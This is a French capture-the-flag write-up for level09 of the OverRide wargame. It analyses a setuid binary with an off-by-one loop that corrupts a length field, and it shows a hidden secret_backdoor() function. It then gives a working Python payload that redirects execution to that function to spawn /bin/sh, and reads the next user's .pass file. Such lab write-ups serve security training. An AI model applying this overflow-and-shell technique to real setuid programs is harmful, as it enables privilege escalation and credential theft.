## Comportement
- J'ai des droits `level09` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 end     users   12959 Oct  2  2016 level09*`
En exécutant le binaire (`./level09`), on observe:
    - 2 inputs : login et message.  
    ```shell
    level09@OverRide:~$ ./level09 
    --------------------------------------------
    |   ~Welcome to l33t-m$n ~    v1337        |
    --------------------------------------------
    >: Enter your username
    >>: cuz
    >: Welcome, cuz
    >: Msg @Unix-Dude
    >>: wtf dude
    >: Msg sent!
    ```


## Analyse
En analysant le binaire (`gdb ./level09`) on observe:
- Une faille : un signe `=` en trop qui fait que l'on loop 41 tours et nn 40 tours sur un buffer de 40, donc 1 de trop. On peut overflow la structure suivante (il s'agit de size) qui determine la longeur du `strncpy()`:  
    ```shell
    idx = 0;
    while (idx < 41 && *(username + idx))
    {
        *(msg->username + idx) = *(username + idx);
        idx += 1;
    }
    ```
- Il y a une fonction `secret_backdoor()` qui n'est jamais appele dans le programme. Elle appelle `system()` avec le parametre qu'on lui fournit : 
    ```shell
    void secret_backdoor(void)
    {
    char shellcode[128];

    fgets(shellcode, 0x80, stdin);
    system(shellcode);
    }
    }
    ```


## Résolution
- Partie 1 du Payload :
    - on utilise 40 octets (A*40) pour remplir le buffer.
    - on ajoute la valeur maximale d'un octet (\xff) 
    - suivie d'un retour à la ligne (\x0a) pour séparer les deux strings. 
- Partie 2 du Payload :
    -  offset de 200 octets (B*200).
    - adresse de la fonction `secret_backdoor()` : (\x8c\x48\x55\x55\x55\x55\x00\x00). (info functions secret_backdoor)
    - on ajoute un retour à la ligne (\x0a).
    - on finit par la commande "/bin/sh".
- On craft notre payload : 
```shell
python -c 'print "A"*40+"\xff"+"\x0a"+"B"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00"+"\x0a"+"/bin/sh"' > /tmp/payload
cat /tmp/payload - | ./level09
```
- Un shell s'ouvre avec de nouveaux privilèges : en effet, si l'on tape `whoami`, on obtient `end`.
- Il ne reste plus qu'à :
  - récupérer le password (`cat /home/users/end/.pass`)
  - quitter le shell (`exit`)
  - et passer au end (`su end`) en renseignant ce password.
  